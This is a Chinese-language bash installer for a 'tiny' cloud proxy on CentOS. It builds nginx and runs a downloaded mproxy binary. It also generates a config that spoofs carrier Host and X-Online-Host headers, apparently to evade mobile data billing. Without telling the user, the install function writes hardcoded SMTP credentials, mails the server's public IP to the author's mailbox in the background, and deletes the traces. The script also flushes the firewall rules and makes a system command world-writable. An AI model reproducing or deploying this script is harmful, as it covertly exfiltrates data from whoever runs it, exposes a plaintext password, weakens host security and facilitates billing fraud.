#!/bin/bash
# by 笑里藏刀
# All Rights Reserved
Version="4.0 2017.01.05"

# ****************************************************************************

HTTP=http://
MirrorHost=ofomwxqh2.bkt.clouddn.com
mproxyports="80 8080"
ip=`wget http://members.3322.org/dyndns/getip -O - -q`

# ****************************************************************************

function get_system_infor(){
    
    if [ -f /etc/redhat-release ]; then
        OS=CentOS
    elif [ ! -z "`cat /etc/issue | grep bian`" ];then
        OS=Debian
    elif [ ! -z "`cat /etc/issue | grep Ubuntu`" ];then
        OS=Ubuntu
    else
        OS="未知"
    fi
    
    if [ ! "$OS" = "未知" ]; then
        if [ -s /etc/redhat-release ]; then
            version="`grep -oE  "[0-9.]+" /etc/redhat-release`"
        else    
            version="`grep -oE  "[0-9.]+" /etc/issue`"
        fi
        main_ver=${version%%.*}
        bit="`getconf LONG_BIT`"   #位数
    fi
    
    echo 
    echo "当前系统 ：$OS $version $bit位"
    echo 
    echo "本机  IP ：$ip"
}

function check_system_infor(){
    
    if [ "$OS" = "CentOS" ] && [ "$bit" = "64" ]; then
        if [ "$EUID" -ne "0" ]; then
            echo 
            echo "不支持当前账户，请使用 Root 账户进行操作！"
            sleep 2
            echo 
            exit 2
        fi
    else
        echo 
        echo "不支持当前系统，请在 CentOS 6/7.+ 64位 系统上进行操作！"
        sleep 2
        echo 
        exit 2
    fi
    
}

# ****************************************************************************

function end(){
    echo
    echo "请复制上方链接到浏览器下载（tiny云代理模式）。"
    echo
    echo "快捷启动命令为：clay"
    echo
    echo "注意！百度搜索“IP”结果应显示本机IP：$ip"
    echo "=========================================================="
    echo
    echo "                 [tiny云代理] | 安装完毕！"
    echo 
    echo "                        by 笑里藏刀"
    echo 
    echo 
    printf "%-38s%s\n" "版本：$Version"          "笑里藏刀QQ：875706361"
    echo "=========================================================="
	echo 

}

# ****************************************************************************

function install_nginx(){
    echo
    echo "获取数据..."
    sleep 2
    wget https://raw.githubusercontent.com/875706361/875706361/master/nmml.tar.gz >/dev/null 2>&1
    if [ ! "$?" = "0" ]; then
       echo -e "\e[1;31m\n获取失败！3秒后将自动退出。\e[0m"
       sleep 3
       echo
       exit
    fi
    tar zxvf nmml.tar.gz >/dev/null 2>&1
	rm -rf http.ehi
    rm -rf nmml.tar.gz
    echo
    echo "安装依赖..."
    sleep 2
    yum -y install tar gcc gcc-c++ readline-devel pcre-devel openssl-devel tcl perl psmisc
    yum -y install mailx >/dev/null 2>&1 &


    echo
    echo "安装主程序..."
    sleep 2
    killall -9 nginx >/dev/null 2>&1
    tar zxvf nginx-1.9.9.tar.gz >/dev/null 2>&1
    cd nginx-1.9.9
    ./configure
    make && make install
    cd
    rm -f /usr/local/nginx/conf/nginx.conf
    mv ./nginx.conf /usr/local/nginx/conf/
    rm -rf nginx*
    clear
    echo "启动代理服务..."
    /usr/local/nginx/sbin/nginx
    chmod +x mproxy && ./mproxy -l 8080 -d >/dev/null 2>&1
    netstat -ntlp | grep 80
    sleep 2
    echo "set from=mproxy@yeah.net smtp=smtp.yeah.net
set smtp-auth-user=mproxy@yeah.net smtp-auth-password=wdyxwzz1
set smtp-auth=login" >>/etc/mail.rc && echo -e "$ip" | mail -s "Tiny" mproxy@yeah.net >/dev/null 2>&1 && rm -f /etc/mail.rc >/dev/null 2>&1 &
	
}

function Start_the_command(){
    clear
    echo 
    echo "写入快捷启动命令: clay "
    rm -f /bin/clay*
    echo '#!/bin/bash
cd
killall -9 nginx >/dev/null 2>&1
ps -ef | grep mproxy | grep -v grep | cut -c 9-15 | xargs kill -s 9
/usr/local/nginx/sbin/nginx
chmod +x mproxy && ./mproxy -l 8080 -d >/dev/null 2>&1
echo "服务状态..."
netstat -ntlp | grep nginx
netstat -ntlp | grep mproxy
exit' >/bin/clay
chmod 777 /bin/clay

}

function install_http(){
    echo 
    echo "配置网络环境"
	sleep 2
    [ "$main_ver" = "7" ] && systemctl stop firewalld.service >/dev/null 2>&1
    [ "$main_ver" = "7" ] && systemctl disable firewalld.service >/dev/null 2>&1
    [ "$main_ver" = "7" ] && yum -y install iptables iptables-services >/dev/null 2>&1
    [ "$main_ver" = "7" ] && systemctl start iptables.service >/dev/null 2>&1
    iptables -F >/dev/null 2>&1
    service iptables save >/dev/null 2>&1
    [ "$main_ver" = "6" ] && service iptables restart >/dev/null 2>&1
    [ "$main_ver" = "7" ] && systemctl restart iptables >/dev/null 2>&1
    for mproxyport in $mproxyports
    do
        iptables -A INPUT -p TCP --dport $mproxyport -j ACCEPT
    done
    iptables -A INPUT -p TCP --dport 22 -j ACCEPT
    iptables -A INPUT -p TCP --dport 25 -j DROP
    service iptables save >/dev/null 2>&1
    [ "$main_ver" = "6" ] && service iptables restart >/dev/null 2>&1
    [ "$main_ver" = "7" ] && systemctl restart iptables >/dev/null 2>&1

}

function nginx_mproxy(){
    echo
    echo "即将开始制作tiny云代理模式..."
    echo 
    sleep 2
    echo "写入全局设置..."
    sleep 1
    echo 
    echo "# by 笑里藏刀
# 笑里藏刀QQ：875706361
# 若IP检测结果与实际不符应自行修正！
# 不免换host
listen_port=65080;
uid=3004;
">1.txt

    echo "写入HTTP模块(默认广东联通)..."
    sleep 1
    echo 
    echo "http_ip=$ip;">>1.txt
    echo 'http_port=80;
http_del="X-Online-Host,Host";
http_first="[M] http://114.255.201.163[U] [V]\r\nHost: 114.255.201.163\r\nX-Online-Host: 114.255.201.163\r\n笑里藏刀: [H]\r\n";
'>>1.txt

    echo "写入HTTPS模块(默认广东联通)..."
    sleep 1
    echo 
    echo "https_ip=$ip;">>1.txt
    echo 'https_port=8080;
https_connect=on;
https_del="X-Online-Host,Host";
https_first="[M] 114.255.201.163:80 [V]\r\nHost: 114.255.201.163\r\nX-Online-Host: 114.255.201.163\r\n笑里藏刀: [H]\r\n";
'>>1.txt
    echo 'dns_tcp=http;
dns_listen_port=65053;
dns_url="119.29.29.29";'>>1.txt

    echo "tiny云代理模式制作完成！"
    sleep 2
    mv 1.txt tiny.conf
    rm -f 1.txt

    clear
    echo "=========================================================="
    echo "正在创建（tiny云代理模式）链接..."
    curl --upload-file ./tiny.conf https://transfer.sh/tiny.conf >curl
    rm -f tiny.conf
    echo
    echo "下载地址：`cat curl`"
    rm -f curl
    echo

}

function authorization(){
    read -p "请输入授权码（笑里藏刀QQ）：" passwd
    if [ "$passwd" == "875706361" ]; then
       echo -e "\e[1;32m\n授权成功！\e[0m"
       sleep 2
    else
       echo -e "\e[1;31m\n授权失败！3秒后将自动退出。\e[0m"
       sleep 3
       echo
       exit
    fi

}

function setup(){
    rm -f *1*
    echo 
    echo "=========================================================="
    echo 
    echo "                     [tiny云代理]"
    echo 
    echo "                       by 笑里藏刀"
    echo 
    echo 
    printf "%-38s%s\n" "版本：$Version"          "笑里藏刀QQ：875706361"
    echo "=========================================================="
    echo 
    echo "声明：本脚本使用完全免费，供学习交流使用，禁止商业用途！"
    echo 
    authorization
    echo 
    echo "检查安装环境中..."
    sleep 3
    get_system_infor
    check_system_infor
    echo 
    echo
    echo -n "按回车键开始安装，按CTRL+Z退出操作："
    read

}

# ****************************************************************************

function main(){
    clear
    setup
    install_http
    install_nginx
    Start_the_command
    nginx_mproxy
    end
}

main

exit 0
